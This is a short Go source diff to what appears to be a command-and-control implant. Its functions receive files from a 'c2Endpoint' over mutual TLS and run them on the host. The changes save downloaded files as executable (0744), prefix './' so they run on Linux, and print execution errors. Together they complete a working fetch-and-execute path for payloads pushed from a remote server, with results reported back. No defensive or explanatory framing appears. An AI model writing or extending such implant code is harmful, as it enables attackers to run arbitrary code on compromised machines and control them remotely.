@@ -9,6 +9,7 @@ import (
 	"net/url"
 	"os"
 	"os/exec"
+	"runtime"
 	"strconv"
 	"sync"
 	"time"
@@ -78,7 +79,7 @@ func awaitFile(c2Endpoint, UUID, kX1, kX2, aesKey, pFile string, ticker *time.Ti
 				continue
 			}
 			filename := fileObj.FileName
-			if err = os.WriteFile(filename, fileObj.FileBytes, 0644); err != nil {
+			if err = os.WriteFile(filename, fileObj.FileBytes, 0744); err != nil {
 				continue
 			}
 			if _, err := os.Stat(pFile); err != nil {
@@ -126,11 +127,16 @@ func awaitCmd(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mT
 }
 
 func handleFile(cmdID int, fname, c2Endpoint, UUID string, broadcast bool, kX1, kX2, aesKey, pFile string, mTLSClient *http.Client) {
+	if runtime.GOOS == "linux" {
+		fname = "./" + fname
+	}
 	cmd := exec.Command(fname)
 	fileObj := models.KarResponseObjectFile{}
 	var cerr bytes.Buffer
 	cmd.Stderr = &cerr
 	if err := cmd.Run(); err != nil {
+		fmt.Println(err)
+		fmt.Println(cerr.String())
 		fileObj.Error = 1
 		fileObj.ErrVal = cerr.String()
 	}
